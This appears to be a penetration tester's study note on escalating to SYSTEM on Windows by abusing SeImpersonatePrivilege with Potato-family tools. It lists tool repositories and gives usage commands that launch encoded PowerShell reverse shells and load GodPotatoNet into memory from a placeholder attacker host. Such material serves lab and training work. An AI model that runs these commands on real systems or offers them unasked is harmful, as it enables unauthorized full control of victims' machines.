
### Overview
---
``SeImpersonatePrivilege`` rights allow that user to "permit programs that run on behalf of that user to impersonate a client".  Specifically, exploiting this allows us to run commands and programs as SYSTEM.


### Exploitation Example
---
- ``SeImpersonatePrivilege`` rights can be checked by running ``whoami /priv``.

![[Pasted image 20230424122917.png]]

- To exploit this, we need to copy some tools to the victim.  Some common Potatoes exploiting ``SeImpersonatePrivilege`` listed below:
	- https://github.com/tylerdotrar/GodPotatoNet (Self-Plug)
	- https://github.com/BeichenDream/GodPotato
	- https://github.com/itm4n/PrintSpoofer
	- https://github.com/zcgonvh/EfsPotato

- Noteworthy point is that successful execution of some of these tools can depend on what .NET version is installed on the host, what version of Windows is running, etc.  With that said, that means you may have to try a couple different executables.
	- ``PrintSpoofer`` seems to work fairly consistently with OffSec boxes.
	- ``GodPotato`` is the newest entry to the potato family and supposedly works on Windows 8 - Windows 11 AND Windows Server 2012 - 2022.
	- ``GodPotatoNet`` is my personal fork of ``GodPotato`` that does the exact same thing, except the output is cleaner and it was slightly modified to allow for execution from memory instead of needing to write to disk (advanced method).

**Example Usage:**
```powershell
# PrintSpoofer executing a PowerShell reverse shell payload
.\PrintSpoofer.exe -c "powershell -e <encoded_powershell_reverse_shell>"

# EfsPotato executing a malicious executable
.\EfsPotato.exe get_dunked_on.exe

# GodPotato executing a PowerShell reverse shell payload
.\GodPotato.exe -cmd "powershell -e <encoded_powershell_reverse_shell>"

# (Advanced Method) Load GodPotatoNet into memory 
[System.Reflection.Assembly]::Load([System.Net.WebClient]::new().DownloadData("http(s)://<ip_addr>/GodPotatoNet.exe"))
# Execute Command as SYSTEM
[GodPotatoNet.Program]::Main(@('-cmd','<command>'))
```
